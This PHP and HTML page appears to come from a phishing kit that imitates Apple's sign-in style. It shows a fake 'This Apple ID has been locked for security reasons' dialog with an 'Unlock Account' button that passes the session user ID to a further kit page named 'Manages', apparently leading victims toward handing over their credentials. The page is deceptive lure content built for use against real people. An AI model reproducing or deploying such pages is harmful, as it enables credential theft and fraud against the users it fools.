<?php
@require "includes/session_protect.php";
@require "includes/functions.php";
@require "includes/simplehtmldom.php";
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
<link href="css/Fonts.css" rel="prefetch stylesheet" type="text/css">
<link href="css/Login.css" media="screen" rel="stylesheet" type="text/css">
<style type="text/css">

</style>
<title></title>
</head>
<body>
<div class="si-body si-container container-fluid" data-theme="lite" id="content">
<div class="widget-container fade-in restrict-max-wh fade-in" data-mode="embed">
<div class="dialog fade-in" style="background: rgba(255, 255, 255, 0.85); border-radius: 0px; border: none; max-width: 485px; max-height: 283px;">
<div class="app-dialog">
<div class="head">
<div class="title" title-align="center">
<h2 style="font-weight: 600;line-height: 1.09375; font-size: 32px; margin: 5px 20px; font-family: sans-serif,initial; letter-spacing: 0.011em; color: #494949; font-heigth"> This Apple ID has been locked for security reasons.</h2>
</div>
</div>
<div body-align="center">
<div class="acc-locked" id="acc-locked">
<div class="dialog-body">
<div class="dialog-info">
<div class="thin" style="font-weight: 500; color: #494949; line-height: 2.0; letter-spacing: 0.021em;">You must unlock your account before signing in.</div>
<a class="Unclock" target="_top" href="../Manages?ref=profiles&userid=<?php echo $_SESSION['user'];?>&stats=account_unlock&sessionsid=<?php echo generateRandomString(86); ?>&protocol=ssl" style="font-weight: 500; padding: 5px 16px; background-color: #0070c9; background: linear-gradient(#42a1ec, #0070c9); color: white; border-radius: 4px; font-size: 18px; text-decoration: none;">Unlock Account</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>